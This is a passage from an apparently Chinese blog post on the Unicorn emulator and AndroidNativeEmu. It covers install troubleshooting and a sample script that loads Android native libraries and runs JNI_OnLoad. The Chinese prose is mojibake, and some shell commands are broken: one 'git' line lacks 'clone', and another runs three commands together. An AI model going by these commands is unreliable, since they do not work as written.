&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">##&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">emu_start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ADDRESS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ADDRESS&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">X86_CODE32&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Emulation done. Below is the CPU context&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r_ecx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reg_read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_X86_REG_ECX&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r_edx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reg_read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_X86_REG_EDX&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;gt;&amp;gt; ECX = 0x&lt;/span>&lt;span class="si">%x&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="n">r_ecx&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;gt;&amp;gt; EDX = 0x&lt;/span>&lt;span class="si">%x&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="n">r_edx&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">except&lt;/span> &lt;span class="n">UcError&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="0x03-ä¸€äº›åŸºäºunicornçš„é¡¹ç›®ç®€å•ä½¿ç”¨">0x03 ä¸€äº›åŸºäºunicornçš„é¡¹ç›®ç®€å•ä½¿ç”¨&lt;/h3>
&lt;h3 id="androidnativeemuhttpsgithubcomp4nda0sandroidnativeemu">&lt;a class="link" href="https://github.com/P4nda0s/AndroidNativeEmu" target="_blank" rel="noopener"
>AndroidNativeEmu&lt;/a>&lt;/h3>
&lt;p>AndroidNativeEmu è®©ä½ èƒ½å¤Ÿè·¨å¹³å°æ¨¡æ‹ŸAndroid Nativeåº“å‡½æ•°ï¼Œæ¯”å¦‚JNI_OnLoadã€Java_XXX_XXç­‰å‡½æ•°&lt;/p>
&lt;p>è¿™æ˜¯çœ‹é›ªæ— åä¾ å¤§ä½¬äºŒæ¬¡ä¿®æ”¹ä¸€ä¸ªç‰ˆæœ¬ï¼ŒçœŸçš„å¤ªå¼ºäº†ã€‚&lt;/p>
&lt;ol>
&lt;li>
&lt;p>å®‰è£…æŠ¥é”™è§£å†³&lt;/p>
&lt;p>å®‰è£…æœ‰äº›å‘ã€‚ã€‚&lt;/p>
&lt;p>é¦–å…ˆè¦æ±‚ä½¿ç”¨python3.7ã€‚ä¹‹å&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">git https://github.com/AeonLucid/AndroidNativeEmu.git
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip install -r requirements.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> samples
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è¿è¡Œpython example.pyå¼€å§‹æŠ¥é”™ã€‚ã€‚&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>åœ¨winä¸Šå…ˆæå®š&lt;code>keystone-engine&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">git clone https://github.com/keystone-engine/keystonecd keystone/bindings/pythonpython setup.py install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;a class="link" href="http://www.keystone-engine.org/download/" target="_blank" rel="noopener"
>ä¸‹è½½&lt;/a> &lt;code>Windows - Core engine&lt;/code> x64&lt;/p>
&lt;p>è§£å‹æ‰¾åˆ°&lt;code>keystone.dll&lt;/code> æ”¾åˆ°&lt;code>X:\location_to_python\Lib\site-packages\keystone\&lt;/code>&lt;/p>
&lt;p>è¿˜æœ‰å¯èƒ½æŠ¥&lt;code>fail to load the dynamic library.&lt;/code>&lt;/p>
&lt;p>ä¸‹è½½ &lt;a class="link" href="https://www.microsoft.com/en-gb/download/details.aspx?id=40784" target="_blank" rel="noopener"
>vcredist_x64&lt;/a> å®‰è£…ã€‚&lt;/p>
&lt;p>ä¹‹åç›´æ¥&lt;code>python example.py&lt;/code> ç»§ç»­æŠ¥&lt;code>ModuleNotFoundError: No module named 'androidemu'&lt;/code>&lt;/p>
&lt;p>åŠ å…¥ä»£ç &lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;../&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>åˆæŠ¥&lt;code>FileNotFoundError: [Errno 2] No such file or directory: 'samples/example_binaries/libc.so'&lt;/code>&lt;/p>
&lt;p>åˆ æ‰ä»£ç é‡Œçš„ &lt;code>samples/example_binaries/libc.so&lt;/code>çš„&lt;code>samples/&lt;/code>&lt;/p>
&lt;p>èƒ½è·‘èµ·æ¥ä½†æ˜¯æŠ¥é”™&lt;code>unicorn.unicorn.UcError: Invalid instruction (UC_ERR_INSN_INVALID)&lt;/code>&lt;/p>
&lt;p>æ”¹æˆ&lt;code>emulator.load_library(&amp;quot;example_binaries/libc.so&amp;quot;, do_init=False)&lt;/code>&lt;/p>
&lt;p>å°±æˆåŠŸè¿è¡Œ&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200413002530.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä½¿ç”¨&lt;/p>
&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">logging&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">posixpath&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;../&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">unicorn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">UcError&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">UC_HOOK_CODE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">UC_HOOK_MEM_UNMAPPED&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">unicorn.arm_const&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">androidemu.emulator&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Emulator&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">androidemu.java.java_class_def&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">JavaClassDef&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">androidemu.java.java_method_def&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">java_method_def&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">debug_utils&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">MainActivity&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">JavaClassDef&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jvm_name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;com/example/debugdemo/MainActivity&amp;#39;&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@java_method_def&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;stringFromJNI&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">signature&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;()Ljava/lang/String;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">native&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">string_from_jni&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">mu&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Configure logging&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">basicConfig&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stream&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">level&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">DEBUG&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">format&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">%(asctime)s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%(levelname)7s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%(name)34s&lt;/span>&lt;span class="s2"> | &lt;/span>&lt;span class="si">%(message)s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">logger&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getLogger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## å…ˆåˆ›å»ºjava class&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## åˆå§‹åŒ–emulater&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">emulator&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Emulator&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">vfs_root&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">posixpath&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">posixpath&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dirname&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__file__&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="s2">&amp;#34;vfs&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">vfp_inst_set&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## æ³¨å†Œ java class&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">java_classloader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_class&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MainActivity&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## load libraries&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">load_library&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;example_binaries/libdl.so&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">load_library&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;example_binaries/libc.so&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">load_library&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;example_binaries/libstdc++.so&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">load_library&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;example_binaries/libm.so&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">tar_lib&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">load_library&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;example_binaries/libtest.so&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Show loaded modules.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">logger&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Loaded modules:&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">module&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">modules&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">logger&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;=&amp;gt; 0x&lt;/span>&lt;span class="si">%08x&lt;/span>&lt;span class="s2"> - &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">module&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">module&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">filename&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">## Run JNI_OnLoad.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">call_symbol&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tar_lib&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;JNI_OnLoad&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">java_vm&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address_ptr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hook_add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_HOOK_MEM_UNMAPPED&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">debug_utils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hook_unmapped&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Do native stuff.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hook_add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_HOOK_CODE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">debug_utils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hook_code&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">main_activity&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MainActivity&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">logger&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Response from JNI call: &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">main_activity&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">string_from_jni&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">emulator&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Dump natives found.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">logger&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Exited EMU.&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">logger&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Native methods registered to MainActivity:&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
